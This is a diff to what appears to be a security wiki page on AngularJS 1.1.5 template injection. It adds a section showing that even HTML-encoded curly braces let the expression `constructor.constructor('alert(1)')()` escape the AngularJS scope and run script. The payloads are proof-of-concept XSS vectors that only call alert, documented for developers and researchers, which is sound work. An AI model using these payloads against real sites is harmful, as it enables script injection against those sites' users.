@@ -16,12 +16,27 @@ AngularJS offers frontend developers a scope object that attempts to isolate glo
 
 == XSS in Template ==
 
+As can be seen in the "paste-and-go"-ready code examples: once an attacker controls the content of the `ng-app` block, almost arbitrary script execution is possible. Everything inside `{{` and `}}` is treated as AngularJS expression and with the mentioned trick we can break out our scope and get access to `window`.
+
 {{{
 <script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
 <div class="ng-app">
 {{constructor.constructor('alert(1)')()}}
 </div>
 }}}
+
+== HTML-encoded XSS in Template ==
+
+AngularJS has no mercy for developers who like to secure their applications by properly encoding user generated data. As the following example shows, even HTML-encoded curlies allow payload execution. 
+
+{{{
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<div class="ng-app">
+&#x7b;&#x7b;constructor.constructor('alert(1)')()&#x7d;&#x7d;
+</div>
+}}}
+
+And just to be on the safe side, AngularJS executes the alert twice.
 
 == XSS via class-attribute ==
 
